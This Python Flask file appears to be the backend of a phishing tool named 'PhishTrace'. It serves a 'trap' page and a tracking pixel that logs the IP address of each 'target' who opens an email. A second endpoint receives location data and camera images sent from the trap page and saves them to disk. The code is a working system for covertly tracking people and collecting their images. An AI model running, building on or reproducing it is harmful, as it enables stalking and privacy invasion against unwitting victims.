from flask import Flask, request, jsonify, send_file
from flask_cors import CORS
import json
import datetime
import base64
import os

app = Flask(__name__)
CORS(app)

# Move the log file and captures folder up one directory so it sits with Main.py
BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOG_FILE = os.path.join(BASE_DIR, "captured_traces.json")
CAPTURES_DIR = os.path.join(BASE_DIR, "captures")

@app.route('/trap', methods=['GET'])
def serve_trap():
    """Serves the Honeypot HTML page."""
    # Ensure trap.html is in the same folder as beacon_server.py
    trap_path = os.path.join(os.path.dirname(__file__), 'trap.html')
    return send_file(trap_path)

@app.route('/trace_pixel', methods=['GET'])
def pixel_tracker():
    """ZERO-CLICK TRACKER: Triggered the moment the email is opened."""
    target = request.args.get('target', 'Unknown_Target')
    ip_address = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
    
    data = {
        "target": target,
        "ip_address": ip_address,
        "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "type": "Email Opened (Pixel)",
        "lat": "Pending Click",
        "lon": "Pending Click"
    }
    
    with open(LOG_FILE, "a") as f:
        f.write(json.dumps(data) + "\n")
        
    print(f"[*] 👁️ PIXEL TRIGGERED: {target} just opened the email! (IP: {ip_address})")
    
    transparent_gif = b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b'
    return transparent_gif, 200, {'Content-Type': 'image/gif'}

@app.route('/trace', methods=['POST'])
def capture_data():
    """1-CLICK TRACKER: Triggered when they click the button and allow permissions."""
    try:
        data = request.json
        data['timestamp'] = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        data['type'] = "Deep Scan (Clicked)"
        
        if request.headers.get('X-Forwarded-For'):
            data['ip_address'] = request.headers.get('X-Forwarded-For').split(',')[0]
        else:
            data['ip_address'] = request.remote_addr

        # 🚀 EXTRACT AND SAVE CAMERA DATA
        if 'camera_data' in data and data['camera_data']:
            try:
                img_data = data['camera_data'].split(',')[1]
                os.makedirs(CAPTURES_DIR, exist_ok=True)
                
                cam_filename = f"target_{int(datetime.datetime.now().timestamp())}.jpg"
                cam_filepath = os.path.join(CAPTURES_DIR, cam_filename)
                
                with open(cam_filepath, "wb") as f:
                    f.write(base64.b64decode(img_data))
                
                data['camera_file'] = cam_filepath
            except Exception as e:
                data['camera_error'] = f"Failed to decode image: {e}"
            
            # Remove the massive Base64 string so it doesn't break the JSON UI
            del data['camera_data']

        with open(LOG_FILE, "a") as f:
            f.write(json.dumps(data) + "\n")
        
        print(f"[*] 🎯 BEACON CAUGHT: Target {data.get('target')} located!")
        return jsonify({"status": "success"}), 200
    except Exception as e:
        print(f"Error processing trace: {e}")
        return jsonify({"status": "error"}), 400

if __name__ == '__main__':
    print("[+] PhishTrace Multi-Stage Beacon Server Active...")
    app.run(host='0.0.0.0', port=5000, debug=False)